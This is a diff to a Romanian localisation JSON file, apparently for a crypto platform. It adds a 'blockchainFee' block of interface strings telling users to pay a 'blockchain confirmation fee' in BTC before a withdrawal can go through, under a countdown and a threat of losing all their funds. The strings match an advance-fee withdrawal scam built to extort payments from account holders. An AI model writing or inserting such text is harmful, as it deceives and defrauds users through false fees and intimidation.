@@ -1,4 +1,18 @@
 {
+  "blockchainFee": {
+    "bannerText": "⚠️ Finalizează plata de ${{amount}} USDT pentru taxa de confirmare blockchain pentru a procesa retragerea",
+    "urgentTitle": "URGENT: Confirmare Blockchain Necesară",
+    "paymentRequired": "Plată de ${{amount}} Necesară",
+    "description": "Retragerea ta necesită o taxă de confirmare blockchain. Neplata în termenul limită va duce la pierderea fondurilor tale.",
+    "sendTo": "Trimite BTC la această adresă:",
+    "equivalentBtc": "(echivalent în BTC la cursul actual)",
+    "warning": "ATENȚIE: Dacă plata nu este primită înainte de expirarea numărătorii inverse, vei pierde TOATE fondurile!",
+    "payNow": "Plătește ${{amount}} Acum",
+    "singleTransaction": "Plata trebuie făcută într-o singură tranzacție",
+    "failed": "Tranzacție Eșuată",
+    "failedDescription": "Retragerea ta a eșuat din cauza neplății taxei de confirmare blockchain. Te rugăm să contactezi suportul.",
+    "addressCopied": "Adresa portofelului a fost copiată"
+  },
   "nav": {
     "features": "Funcții",
     "plans": "Planuri",
